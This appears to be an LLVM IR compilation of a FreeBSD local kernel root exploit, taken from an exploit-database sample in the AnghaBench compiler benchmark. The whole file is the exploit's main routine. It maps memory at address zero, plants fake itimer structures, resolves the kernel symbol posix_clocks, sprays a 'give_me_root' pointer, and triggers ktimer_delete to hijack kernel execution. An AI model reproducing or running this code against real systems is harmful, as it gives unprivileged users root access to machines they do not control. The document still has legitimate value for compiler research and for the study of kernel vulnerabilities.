; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_8261.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_8261.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.itimer = type { i32, i32, i64 }
%struct.kld_sym_lookup = type { i32, i8*, i32 }

@.str = private unnamed_addr constant [104 x i8] c"FreeBSD local kernel root exploit\0Aby: christer/mu-b\0Ahttp://www.bsdcitizen.org/ -- BSDCITIZEN 2008!@$!\0A\0A\00", align 1
@ITPSIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"%s: failed to mmap %d-bytes\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [55 x i8] c"* allocated pointer page: 0x%08X -> 0x%08X [%d-bytes]\0A\00", align 1
@.str.3 = private unnamed_addr constant [56 x i8] c"* allocated itimer struct: 0x%08X -> 0x%08X [%d-bytes]\0A\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"* filling pointer page... \00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"posix_clocks\00", align 1
@KLDSYM_LOOKUP = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [35 x i8] c"%s: failed to lookup posix_clocks\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"* found posix_clocks @ [0x%x]\0A\00", align 1
@give_me_root = common dso_local global i64 0, align 8
@.str.9 = private unnamed_addr constant [48 x i8] c"* it_page->it_clockid: 0x%08X [access @0x%08X]\0A\00", align 1
@.str.10 = private unnamed_addr constant [26 x i8] c"* ktimer_delete (0x%08X)\0A\00", align 1
@LOOKUP = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [24 x i8] c"* ktimer_delete: %d %d\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.itimer**, align 8
  %7 = alloca %struct.itimer*, align 8
  %8 = alloca %struct.kld_sym_lookup, align 8
  %9 = alloca [16 x i8*], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([104 x i8], [104 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* @ITPSIZE, align 4
  %14 = load i32, i32* @PROT_READ, align 4
  %15 = load i32, i32* @PROT_WRITE, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @MAP_FIXED, align 4
  %18 = load i32, i32* @MAP_ANON, align 4
  %19 = or i32 %17, %18
  %20 = call i8* @mmap(%struct.itimer** null, i32 %13, i32 %16, i32 %19, i32 -1, i32 0)
  %21 = bitcast i8* %20 to %struct.itimer**
  store %struct.itimer** %21, %struct.itimer*** %6, align 8
  %22 = load %struct.itimer**, %struct.itimer*** %6, align 8
  %23 = icmp ult %struct.itimer** %22, null
  br i1 %23, label %24, label %33

24:                                               ; preds = %2
  %25 = load i32, i32* @stderr, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = load i32, i32* @ITPSIZE, align 4
  %30 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %28, i32 %29)
  %31 = load i32, i32* @EXIT_FAILURE, align 4
  %32 = call i32 @exit(i32 %31) #3
  unreachable

33:                                               ; preds = %2
  %34 = load %struct.itimer**, %struct.itimer*** %6, align 8
  %35 = ptrtoint %struct.itimer** %34 to i32
  %36 = load %struct.itimer**, %struct.itimer*** %6, align 8
  %37 = ptrtoint %struct.itimer** %36 to i32
  %38 = load i32, i32* @ITPSIZE, align 4
  %39 = add nsw i32 %37, %38
  %40 = load i32, i32* @ITPSIZE, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.2, i64 0, i64 0), i32 %35, i32 %39, i32 %40)
  %42 = load %struct.itimer**, %struct.itimer*** %6, align 8
  %43 = load i32, i32* @ITPSIZE, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.itimer*, %struct.itimer** %42, i64 %44
  %46 = load i32, i32* @PROT_READ, align 4
  %47 = load i32, i32* @PROT_WRITE, align 4
  %48 = or i32 %46, %47
  %49 = load i32, i32* @MAP_FIXED, align 4
  %50 = load i32, i32* @MAP_ANON, align 4
  %51 = or i32 %49, %50
  %52 = call i8* @mmap(%struct.itimer** %45, i32 16, i32 %48, i32 %51, i32 -1, i32 0)
  %53 = bitcast i8* %52 to %struct.itimer*
  store %struct.itimer* %53, %struct.itimer** %7, align 8
  %54 = load %struct.itimer*, %struct.itimer** %7, align 8
  %55 = icmp ult %struct.itimer* %54, null
  br i1 %55, label %56, label %64

56:                                               ; preds = %33
  %57 = load i32, i32* @stderr, align 4
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %57, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %60, i64 16)
  %62 = load i32, i32* @EXIT_FAILURE, align 4
  %63 = call i32 @exit(i32 %62) #3
  unreachable

64:                                               ; preds = %33
  %65 = load %struct.itimer*, %struct.itimer** %7, align 8
  %66 = ptrtoint %struct.itimer* %65 to i32
  %67 = load %struct.itimer*, %struct.itimer** %7, align 8
  %68 = ptrtoint %struct.itimer* %67 to i32
  %69 = sext i32 %68 to i64
  %70 = add i64 %69, 16
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.3, i64 0, i64 0), i32 %66, i64 %70, i64 16)
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  %73 = load i32, i32* @stdout, align 4
  %74 = call i32 @fflush(i32 %73)
  store i32 0, i32* %10, align 4
  br label %75

75:                                               ; preds = %88, %64
  %76 = load i32, i32* %10, align 4
  %77 = sext i32 %76 to i64
  %78 = load i32, i32* @ITPSIZE, align 4
  %79 = sext i32 %78 to i64
  %80 = udiv i64 %79, 8
  %81 = icmp ult i64 %77, %80
  br i1 %81, label %82, label %91

82:                                               ; preds = %75
  %83 = load %struct.itimer*, %struct.itimer** %7, align 8
  %84 = load %struct.itimer**, %struct.itimer*** %6, align 8
  %85 = load i32, i32* %10, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.itimer*, %struct.itimer** %84, i64 %86
  store %struct.itimer* %83, %struct.itimer** %87, align 8
  br label %88

88:                                               ; preds = %82
  %89 = load i32, i32* %10, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %10, align 4
  br label %75

91:                                               ; preds = %75
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %93 = getelementptr inbounds %struct.kld_sym_lookup, %struct.kld_sym_lookup* %8, i32 0, i32 0
  store i32 24, i32* %93, align 8
  %94 = getelementptr inbounds %struct.kld_sym_lookup, %struct.kld_sym_lookup* %8, i32 0, i32 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0), i8** %94, align 8
  %95 = load i32, i32* @KLDSYM_LOOKUP, align 4
  %96 = call i64 @kldsym(i32 0, i32 %95, %struct.kld_sym_lookup* %8)
  %97 = icmp slt i64 %96, 0
  br i1 %97, label %98, label %106

98:                                               ; preds = %91
  %99 = load i32, i32* @stderr, align 4
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 0
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %99, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0), i8* %102)
  %104 = load i32, i32* @EXIT_FAILURE, align 4
  %105 = call i32 @exit(i32 %104) #3
  unreachable

106:                                              ; preds = %91
  %107 = getelementptr inbounds %struct.kld_sym_lookup, %struct.kld_sym_lookup* %8, i32 0, i32 2
  %108 = load i32, i32* %107, align 8
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i32 %108)
  store i32 0, i32* %10, align 4
  br label %110

110:                                              ; preds = %119, %106
  %111 = load i32, i32* %10, align 4
  %112 = icmp slt i32 %111, 16
  br i1 %112, label %113, label %122

113:                                              ; preds = %110
  %114 = load i64, i64* @give_me_root, align 8
  %115 = inttoptr i64 %114 to i8*
  %116 = load i32, i32* %10, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [16 x i8*], [16 x i8*]* %9, i64 0, i64 %117
  store i8* %115, i8** %118, align 8
  br label %119

119:                                              ; preds = %113
  %120 = load i32, i32* %10, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %10, align 4
  br label %110

122:                                              ; preds = %110
  %123 = load %struct.itimer*, %struct.itimer** %7, align 8
  %124 = call i32 @memset(%struct.itimer* %123, i32 0, i32 16)
  store i32 0, i32* %10, align 4
  br label %125

125:                                              ; preds = %134, %122
  %126 = load i32, i32* %10, align 4
  %127 = icmp slt i32 %126, 10
  br i1 %127, label %128, label %137

128:                                              ; preds = %125
  %129 = load %struct.itimer*, %struct.itimer** %7, align 8
  %130 = bitcast %struct.itimer* %129 to i32*
  %131 = load i32, i32* %10, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i32, i32* %130, i64 %132
  store i32 4, i32* %133, align 4
  br label %134

134:                                              ; preds = %128
  %135 = load i32, i32* %10, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %10, align 4
  br label %125

137:                                              ; preds = %125
  %138 = load %struct.itimer*, %struct.itimer** %7, align 8
  %139 = getelementptr inbounds %struct.itimer, %struct.itimer* %138, i32 0, i32 0
  store i32 0, i32* %139, align 8
  %140 = load %struct.itimer*, %struct.itimer** %7, align 8
  %141 = getelementptr inbounds %struct.itimer, %struct.itimer* %140, i32 0, i32 2
  store i64 0, i64* %141, align 8
  %142 = getelementptr inbounds [16 x i8*], [16 x i8*]* %9, i64 0, i64 8
  %143 = ptrtoint i8** %142 to i32
  %144 = getelementptr inbounds %struct.kld_sym_lookup, %struct.kld_sym_lookup* %8, i32 0, i32 2
  %145 = load i32, i32* %144, align 8
  %146 = sub nsw i32 %143, %145
  %147 = sdiv i32 %146, 20
  %148 = load %struct.itimer*, %struct.itimer** %7, align 8
  %149 = getelementptr inbounds %struct.itimer, %struct.itimer* %148, i32 0, i32 1
  store i32 %147, i32* %149, align 4
  %150 = load %struct.itimer*, %struct.itimer** %7, align 8
  %151 = getelementptr inbounds %struct.itimer, %struct.itimer* %150, i32 0, i32 1
  %152 = load i32, i32* %151, align 4
  %153 = getelementptr inbounds [16 x i8*], [16 x i8*]* %9, i64 0, i64 8
  %154 = ptrtoint i8** %153 to i32
  %155 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.9, i64 0, i64 0), i32 %152, i32 %154)
  %156 = load i32, i32* @LOOKUP, align 4
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.10, i64 0, i64 0), i32 %156)
  %158 = call i32 @sleep(i32 2)
  %159 = call i32 @ktimer_create(i32 0, i32 0, i32* %10)
  %160 = load i32, i32* @LOOKUP, align 4
  %161 = call i32 @ktimer_delete(i32 %160)
  store i32 %161, i32* %11, align 4
  %162 = load i32, i32* %11, align 4
  %163 = load %struct.itimer*, %struct.itimer** %7, align 8
  %164 = getelementptr inbounds %struct.itimer, %struct.itimer* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.11, i64 0, i64 0), i32 %162, i32 %165)
  %167 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %167
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @mmap(%struct.itimer**, i32, i32, i32, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fflush(i32) #1

declare dso_local i64 @kldsym(i32, i32, %struct.kld_sym_lookup*) #1

declare dso_local i32 @memset(%struct.itimer*, i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @ktimer_create(i32, i32, i32*) #1

declare dso_local i32 @ktimer_delete(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
